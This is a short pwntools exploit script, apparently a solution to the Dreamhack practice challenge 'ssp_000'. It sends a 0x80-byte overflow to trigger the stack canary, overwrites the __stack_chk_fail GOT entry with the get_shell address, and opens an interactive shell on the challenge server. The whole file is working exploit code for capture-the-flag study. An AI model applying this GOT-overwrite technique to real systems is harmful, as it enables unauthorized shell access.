from pwn import *
context.log_level='debug'

hosts = 'host1.dreamhack.games'
port = 12413

p = remote(hosts,port)

elf = ELF('./ssp_000')

get_shell = elf.symbols['get_shell']
__stack_chk_fail_got = elf.got['__stack_chk_fail']

log.info('get_shell : '+str(get_shell))
log.info('__stack_chk_fail : '+str(__stack_chk_fail_got))

payload = b'A'*0x80

p.sendline(payload)
p.sendlineafter('Addr : ',str(__stack_chk_fail_got))
p.sendlineafter('Value : ',str(get_shell))


p.interactive()
